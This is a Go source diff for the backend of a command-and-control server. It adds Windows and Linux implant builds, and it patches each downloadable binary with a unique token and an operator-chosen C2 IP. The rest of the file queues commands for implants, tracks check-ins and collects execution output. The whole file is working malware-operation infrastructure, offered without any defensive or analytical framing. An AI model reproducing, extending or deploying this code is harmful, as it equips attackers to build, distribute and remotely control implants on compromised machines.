@@ -16,103 +16,145 @@ import (
 )
 
 const (
-	placeholder   = "deadbeef-0000-0000-0000-000000000000"
-	baseClientRel = "binaries/base_client"
+	tokenPlaceholder = "deadbeef-0000-0000-0000-000000000000"
+	c2Placeholder    = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX" // 64 bytes
+
+	baseClientWindowsRel = "binaries/base_client_windows.exe"
+	baseClientLinuxRel   = "binaries/base_client_linux"
+	baseClientRel        = "binaries/base_client"
 )
 
-var baseClientPath string
+var (
+	baseClientWindowsPath string
+	baseClientLinuxPath   string
+	baseClientPathOld     string
+)
 
 func init() {
-	baseClientPath = filepath.Join(baseClientRel)
-	if _, err := os.Stat(baseClientPath); os.IsNotExist(err) {
-		wd, _ := os.Getwd()
-		panic(fmt.Sprintf("CRITICAL ERROR: Pre-compiled base_client binary not found. Looked at path: '%s'. Current working directory: '%s'. Please ensure 'binaries/base_client' exists relative to your execution path or adjust 'baseClientPath' resolution.", baseClientPath, wd))
-	} else {
-		fmt.Printf("CONTROLLER.init: Pre-compiled base_client binary located successfully at: %s\n", baseClientPath)
+	wd, _ := os.Getwd()
+	baseClientWindowsPath = filepath.Join(wd, baseClientWindowsRel)
+	if _, err := os.Stat(baseClientWindowsPath); os.IsNotExist(err) {
+		panic(fmt.Sprintf("CRITICAL ERROR: Windows base binary not found at: '%s'", baseClientWindowsPath))
 	}
+	baseClientLinuxPath = filepath.Join(wd, baseClientLinuxRel)
+	if _, err := os.Stat(baseClientLinuxPath); os.IsNotExist(err) {
+		panic(fmt.Sprintf("CRITICAL ERROR: Linux base binary not found at: '%s'", baseClientLinuxPath))
+	}
+	baseClientPathOld = filepath.Join(wd, baseClientRel)
+	// Optional: Log successful loading
+	fmt.Printf("CONTROLLER.init: Windows base binary: %s\n", baseClientWindowsPath)
+	fmt.Printf("CONTROLLER.init: Linux base binary: %s\n", baseClientLinuxPath)
 }
 
-// GenerateImplant creates a DB record ONLY. It does not serve the binary.
-// Called by "Generate New Implant" button (POST /api/generate-implant)
+// GenerateImplant - (No changes needed here, it already takes target_os)
 func GenerateImplant(c *gin.Context) {
 	userIfc, _ := c.Get("user_id")
 	userID := userIfc.(int)
 
-	// 1. Create a new implant record in the database.
-	imp, err := database.CreateImplant(userID)
-	if err != nil {
-		fmt.Printf("CONTROLLER.GenerateImplant: ERROR - Failed to create implant record in DB: %v\n", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate implant record in database"})
+	var req struct {
+		TargetOS string `json:"target_os" binding:"required,oneof=windows linux"`
+	}
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request: 'target_os' (windows/linux) is required. " + err.Error()})
 		return
 	}
-	fmt.Printf("CONTROLLER.GenerateImplant: Successfully created DB record for new implant. DB-UniqueToken: [%s]\n", imp.UniqueToken)
 
-	// 2. Return success response with implant details (or just a success message)
-	c.JSON(http.StatusCreated, gin.H{
-		"message": "Implant record generated successfully",
-	})
+	imp, err := database.CreateImplant(userID, req.TargetOS)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate implant record"})
+		return
+	}
+	c.JSON(http.StatusCreated, gin.H{"message": "Implant record generated for " + req.TargetOS, "implant": imp})
 }
 
-// DownloadImplant reads base_client, patches it with the implant's unique_token from DB, and serves it.
-// Called by "Download" buttons in the table (GET /api/implants/<implant_db_token>/download)
-func DownloadImplant(c *gin.Context) {
-	implantDBUniqueToken := c.Param("implant_id") // This is the unique_token from the DB.
+// DownloadConfiguredImplant - MODIFIED
+// POST /api/implants/:implant_id/download-configured
+func DownloadConfiguredImplant(c *gin.Context) {
+	implantDBUniqueToken := c.Param("implant_id")
 	userID := c.MustGet("user_id").(int)
 
-	fmt.Printf("CONTROLLER.DownloadImplant: Received request to download implant with ID from URL: [%s]\n", implantDBUniqueToken)
-
-	// 1. Verify user ownership and that the implant EXISTS in the DB with this token.
-	_, err := database.GetImplantByToken(userID, implantDBUniqueToken)
-	if err != nil {
-		fmt.Printf("CONTROLLER.DownloadImplant: ERROR - Implant with DB-UniqueToken [%s] not found in database or unauthorized for user %d. Error: %v\n", implantDBUniqueToken, userID, err)
-		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found in database or unauthorized"})
+	// MODIFIED: Request body now only expects C2_IP
+	var req struct {
+		C2IP string `json:"c2_ip" binding:"required"`
+	}
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload: 'c2_ip' is required. " + err.Error()})
 		return
 	}
-	fmt.Printf("CONTROLLER.DownloadImplant: Successfully verified ownership for implant [%s]\n", implantDBUniqueToken)
 
-	// 2. Read the pre-compiled base_client binary.
-	baseBinaryData, err := os.ReadFile(baseClientPath)
+	// 1. Verify user ownership AND fetch the implant to get its TargetOS
+	implant, err := database.GetImplantByToken(userID, implantDBUniqueToken)
 	if err != nil {
-		fmt.Printf("CONTROLLER.DownloadImplant: ERROR - reading base_client binary from '%s': %v\n", baseClientPath, err)
+		fmt.Printf("CONTROLLER.DownloadConfiguredImplant: ERROR - Implant [%s] not found or unauthorized for user %d. Error: %v\n", implantDBUniqueToken, userID, err)
+		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
+		return
+	}
+	// We now have implant.TargetOS
+
+	// 2. Select binary path and output filename based on implant.TargetOS (from DB)
+	var selectedBinaryPath string
+	var outputFilename string
+
+	if implant.TargetOS == "windows" {
+		selectedBinaryPath = baseClientWindowsPath
+		outputFilename = fmt.Sprintf("implant_%s_windows.exe", implantDBUniqueToken)
+	} else if implant.TargetOS == "linux" {
+		selectedBinaryPath = baseClientLinuxPath
+		outputFilename = fmt.Sprintf("implant_%s_linux", implantDBUniqueToken)
+	} else {
+		// This case should ideally not happen if TargetOS is always set during generation
+		fmt.Printf("CONTROLLER.DownloadConfiguredImplant: ERROR - Implant [%s] has an unknown or unset TargetOS: [%s]\n", implantDBUniqueToken, implant.TargetOS)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Implant has an invalid target OS configured in the database."})
+		return
+	}
+
+	// 3. Read the base binary
+	baseBinaryData, err := os.ReadFile(selectedBinaryPath)
+	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read base client binary: " + err.Error()})
 		return
 	}
-	fmt.Printf("CONTROLLER.DownloadImplant: Read %d bytes from base_client: %s\n", len(baseBinaryData), baseClientPath)
 
-	// 3. Create a *new slice* (copy) for patching.
 	patchedData := make([]byte, len(baseBinaryData))
 	copy(patchedData, baseBinaryData)
 
-	// 4. Find placeholder in the *copied* data.
-	idx := bytes.LastIndex(patchedData, []byte(placeholder))
-	if idx == -1 {
-		fmt.Printf("CONTROLLER.DownloadImplant: ERROR - placeholder string [%s] NOT FOUND in the base_client binary data for download.\n", placeholder)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "Placeholder not found in base client binary. Download failed."})
+	// 4. Patch Unique Token (implantDBUniqueToken)
+	tokenIdx := bytes.LastIndex(patchedData, []byte(tokenPlaceholder))
+	if tokenIdx == -1 {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Token placeholder not found in base client binary."})
 		return
 	}
-	fmt.Printf("CONTROLLER.DownloadImplant: Placeholder [%s] found at index %d for download.\n", placeholder, idx)
-
-	// 5. Patch the *copied* data with the token from the DB.
-	if len(implantDBUniqueToken) != len(placeholder) {
-		fmt.Printf("CONTROLLER.DownloadImplant: ERROR - Length mismatch for download! Placeholder len: %d, DB UniqueToken len: %d. Cannot patch.\n", len(placeholder), len(implantDBUniqueToken))
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "Critical error: ID length mismatch for patching for download."})
+	if len(implantDBUniqueToken) != len(tokenPlaceholder) {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Critical error: Implant ID length mismatch for patching."})
 		return
 	}
-	bytesCopied := copy(patchedData[idx:], []byte(implantDBUniqueToken))
-	fmt.Printf("CONTROLLER.DownloadImplant: Patched data for download. Replaced placeholder with: [%s]. Bytes copied: %d.\n", implantDBUniqueToken, bytesCopied)
+	copy(patchedData[tokenIdx:], []byte(implantDBUniqueToken))
 
-	// 6. Construct filename. The UniqueToken for the filename is implantDBUniqueToken.
-	outName := fmt.Sprintf("implant_%s", implantDBUniqueToken)
-	fmt.Printf("CONTROLLER.DownloadImplant: Download filename for existing implant will be: [%s]\n", outName)
+	// 5. Patch C2 IP (using req.C2IP from request body)
+	c2Idx := bytes.LastIndex(patchedData, []byte(c2Placeholder))
+	if c2Idx == -1 {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "C2 IP placeholder not found in base client binary."})
+		return
+	}
+	c2IPBytes := []byte(req.C2IP)
+	if len(c2IPBytes) > len(c2Placeholder) {
+		errorMsg := fmt.Sprintf("C2 IP is too long. Max length: %d, Got: %d", len(c2Placeholder), len(c2IPBytes))
+		c.JSON(http.StatusBadRequest, gin.H{"error": errorMsg})
+		return
+	}
+	paddedC2IP := make([]byte, len(c2Placeholder))
+	copy(paddedC2IP, c2IPBytes)
+	copy(patchedData[c2Idx:], paddedC2IP)
 
-	// 7. Serve *patchedData*.
-	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", outName))
+	// 6. Serve patched data
+	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", outputFilename))
 	c.Header("Content-Type", "application/octet-stream")
 	c.Data(http.StatusOK, "application/octet-stream", patchedData)
-	fmt.Printf("CONTROLLER.DownloadImplant: Served patched existing implant binary named [%s].\n", outName)
+	fmt.Printf("CONTROLLER.DownloadConfiguredImplant: Served patched binary [%s] for implant [%s] (OS: %s) with C2 IP: %s\n", outputFilename, implantDBUniqueToken, implant.TargetOS, req.C2IP)
 }
 
-// GetUserImplants returns all implants owned by the current user.
+// --- Other controller functions (GetUserImplants, SendCommand, etc.) remain the same ---
+// GetUserImplants remains the same
 func GetUserImplants(c *gin.Context) {
 	userID := c.MustGet("user_id").(int)
 	implants, err := database.GetImplantsByUserID(userID)
@@ -123,18 +165,17 @@ func GetUserImplants(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"implants": implants})
 }
 
-// SendCommand sends a command to a specific implant (used by dashboard).
+// SendCommand remains the same
 func SendCommand(c *gin.Context) {
 	userID := c.MustGet("user_id").(int)
 	var req struct {
-		ImplantID string `json:"implant_id"` // This is unique_token
+		ImplantID string `json:"implant_id"`
 		Command   string `json:"command"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
 		return
 	}
-
 	imp, err := database.GetImplantByID(req.ImplantID)
 	if err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
@@ -144,7 +185,6 @@ func SendCommand(c *gin.Context) {
 		c.JSON(http.StatusForbidden, gin.H{"error": "You do not own this implant"})
 		return
 	}
-
 	cmd := models.Command{
 		ImplantID: req.ImplantID,
 		Command:   req.Command,
@@ -154,36 +194,26 @@ func SendCommand(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create command"})
 		return
 	}
-
-	c.JSON(http.StatusOK, gin.H{
-		"message":    "Command sent successfully",
-		"implant_id": req.ImplantID,
-		"command_id": cmd.ID,
-		"command":    req.Command,
-	})
+	c.JSON(http.StatusOK, gin.H{"message": "Command sent successfully", "command_id": cmd.ID})
 }
 
-// ImplantClientFetchCommands is called by the implant to get pending commands.
+// ImplantClientFetchCommands remains the same
 func ImplantClientFetchCommands(c *gin.Context) {
 	implantUniqueToken := c.Param("unique_token")
 	if implantUniqueToken == "" {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant unique token is required"})
 		return
 	}
-
 	var imp models.Implant
 	if err := config.DB.Where("unique_token = ?", implantUniqueToken).First(&imp).Error; err != nil {
-		fmt.Printf("CONTROLLER.ImplantClientFetchCommands: Implant with unique_token [%s] not found in DB.\n", implantUniqueToken)
 		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
 		return
 	}
-
 	imp.LastSeen = time.Now()
 	imp.Status = "online"
 	if err := config.DB.Save(&imp).Error; err != nil {
-		fmt.Printf("CONTROLLER.ImplantClientFetchCommands: Error updating implant %s status/last_seen: %v\n", implantUniqueToken, err)
+		// Log error
 	}
-
 	cmds, err := database.GetPendingCommandsForImplant(implantUniqueToken)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch pending commands"})
@@ -192,29 +222,28 @@ func ImplantClientFetchCommands(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"commands": cmds})
 }
 
-// DashboardGetCommandsForImplant returns all commands for a given implant, for dashboard use.
+// DashboardGetCommandsForImplant remains the same
 func DashboardGetCommandsForImplant(c *gin.Context) {
 	userID := c.MustGet("user_id").(int)
 	implantUniqueToken := c.Param("implant_id")
-
 	if implantUniqueToken == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant ID (unique token) is required"})
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant ID is required"})
 		return
 	}
 	var implant models.Implant
 	if err := config.DB.Where("unique_token = ? AND user_id = ?", implantUniqueToken, userID).First(&implant).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or you do not have permission to access it"})
+		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
 		return
 	}
 	cmds, err := database.GetCommandsByImplantID(implantUniqueToken)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch commands for implant"})
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch commands"})
 		return
 	}
 	c.JSON(http.StatusOK, gin.H{"commands": cmds})
 }
 
-// HandleCommandResult receives execution output for a command.
+// HandleCommandResult remains the same
 func HandleCommandResult(c *gin.Context) {
 	var req struct {
 		CommandID int    `json:"command_id"`
@@ -224,37 +253,29 @@ func HandleCommandResult(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
 		return
 	}
-
 	var cmd models.Command
 	if err := config.DB.First(&cmd, req.CommandID).Error; err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "Command not found"})
 		return
 	}
-
 	if cmd.Status == "executed" {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Command already executed"})
 		return
 	}
-
 	var imp models.Implant
 	if err := config.DB.Where("unique_token = ?", cmd.ImplantID).First(&imp).Error; err == nil {
 		imp.LastSeen = time.Now()
 		imp.Status = "online"
-		if errSave := config.DB.Save(&imp).Error; errSave != nil {
-			fmt.Printf("CONTROLLER.HandleCommandResult: Error updating implant status for %s: %v\n", imp.UniqueToken, errSave)
-		}
-	} else {
-		fmt.Printf("CONTROLLER.HandleCommandResult: Warning - Implant %s (from command %d) not found in DB. Proceeding to update command.\n", cmd.ImplantID, req.CommandID)
+		config.DB.Save(&imp)
 	}
-
 	if err := database.MarkCommandAsExecuted(req.CommandID, req.Output); err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update command status"})
 		return
 	}
-	c.JSON(http.StatusOK, gin.H{"message": "Command result received successfully"})
+	c.JSON(http.StatusOK, gin.H{"message": "Command result received"})
 }
 
-// CheckinImplant handles implant check-ins.
+// CheckinImplant remains the same
 func CheckinImplant(c *gin.Context) {
 	var req struct {
 		UniqueToken string `json:"implant_id"`
@@ -264,14 +285,11 @@ func CheckinImplant(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
 		return
 	}
-
 	var imp models.Implant
 	if err := config.DB.Where("unique_token = ?", req.UniqueToken).First(&imp).Error; err != nil {
-		fmt.Printf("CONTROLLER.CheckinImplant: Implant with unique_token [%s] not found in DB for check-in.\n", req.UniqueToken)
 		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
 		return
 	}
-
 	imp.Status = "online"
 	imp.Deployed = true
 	if req.IPAddress != "" {
@@ -284,33 +302,64 @@ func CheckinImplant(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update implant on check-in"})
 		return
 	}
-	c.JSON(http.StatusOK, gin.H{
-		"message":   "Check-in successful",
-		"status":    imp.Status,
-		"last_seen": imp.LastSeen,
-	})
+	c.JSON(http.StatusOK, gin.H{"message": "Check-in successful"})
 }
 
-// DeleteImplant deletes an implant owned by the current user.
+// DeleteImplant remains the same
 func DeleteImplant(c *gin.Context) {
 	token := c.Param("implant_id")
 	userID := c.MustGet("user_id").(int)
-
 	var imp models.Implant
-	if err := config.DB.
-		Where("unique_token = ? AND user_id = ?", token, userID).
-		First(&imp).Error; err != nil {
+	if err := config.DB.Where("unique_token = ? AND user_id = ?", token, userID).First(&imp).Error; err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
 		return
 	}
-
 	if err := config.DB.Where("implant_id = ?", imp.UniqueToken).Delete(&models.Command{}).Error; err != nil {
-		fmt.Printf("CONTROLLER.DeleteImplant: Warning - Failed to delete commands for implant %s: %v\n", imp.UniqueToken, err)
+		// Log warning
 	}
-
 	if err := config.DB.Delete(&imp).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to delete implant"})
 		return
 	}
 	c.JSON(http.StatusOK, gin.H{"message": "Implant deleted successfully"})
+}
+
+// DownloadImplant (GET) remains as is, or could be deprecated if not needed.
+func DownloadImplant(c *gin.Context) {
+	implantDBUniqueToken := c.Param("implant_id")
+	userID := c.MustGet("user_id").(int)
+
+	fmt.Printf("CONTROLLER.DownloadImplant (GET): Received request for implant ID: [%s]\n", implantDBUniqueToken)
+
+	_, err := database.GetImplantByToken(userID, implantDBUniqueToken)
+	if err != nil {
+		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
+		return
+	}
+
+	baseBinaryData, err := os.ReadFile(baseClientPathOld)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read base client binary: " + err.Error()})
+		return
+	}
+
+	patchedData := make([]byte, len(baseBinaryData))
+	copy(patchedData, baseBinaryData)
+
+	idx := bytes.LastIndex(patchedData, []byte(tokenPlaceholder))
+	if idx == -1 {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Placeholder not found in base client binary."})
+		return
+	}
+	if len(implantDBUniqueToken) != len(tokenPlaceholder) {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Critical error: ID length mismatch."})
+		return
+	}
+	copy(patchedData[idx:], []byte(implantDBUniqueToken))
+
+	outName := fmt.Sprintf("implant_legacy_%s", implantDBUniqueToken)
+	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", outName))
+	c.Header("Content-Type", "application/octet-stream")
+	c.Data(http.StatusOK, "application/octet-stream", patchedData)
+	fmt.Printf("CONTROLLER.DownloadImplant (GET): Served legacy binary [%s].\n", outName)
 }
